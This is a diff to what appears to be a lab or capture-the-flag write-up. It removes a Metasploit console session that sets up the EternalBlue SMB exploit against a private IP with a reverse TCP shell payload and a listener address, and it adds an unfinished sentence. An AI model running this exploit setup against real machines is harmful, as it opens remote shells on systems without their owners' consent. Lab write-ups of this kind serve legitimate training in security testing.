@@ -664,53 +664,9 @@ tun0: flags=209<UP,POINTOPOINT,RUNNING,NOARP>  mtu 1380
         RX errors 0  dropped 0  overruns 0  frame 0
         TX packets 1759  bytes 247988 (242.1 KiB)
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-msf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
-payload => windows/x64/shell/reverse_tcp
-msf exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.48.181.153
-RHOST => 10.48.181.153
-msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.134.39
-LHOST => 192.168.134.39
-msf exploit(windows/smb/ms17_010_eternalblue) > show options
-
-Module options (exploit/windows/smb/ms17_010_eternalblue):
-
-   Name           Current Setting  Required  Description
-   ----           ---------------  --------  -----------
-   RHOSTS         10.48.181.153    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-   RPORT          445              yes       The target port (TCP)
-   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Win
-                                             dows Embedded Standard 7 target machines.
-   SMBPass                         no        (Optional) The password for the specified username
-   SMBUser                         no        (Optional) The username to authenticate as
-   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows
-                                              Embedded Standard 7 target machines.
-   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded
-                                             Standard 7 target machines.
-
-
-Payload options (windows/x64/shell/reverse_tcp):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     192.168.134.39   yes       The listen address (an interface may be specified)
-   LPORT     4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic Target
-
-
-
-View the full module info with the info, or info -d command.
-
-msf exploit(windows/smb/ms17_010_eternalblue) > 
-
 ```
+
+Here's the reason why we 
 <div align="center">
 <br>
 ※※※※※※※※※※※※※※※※※※※※※※※※
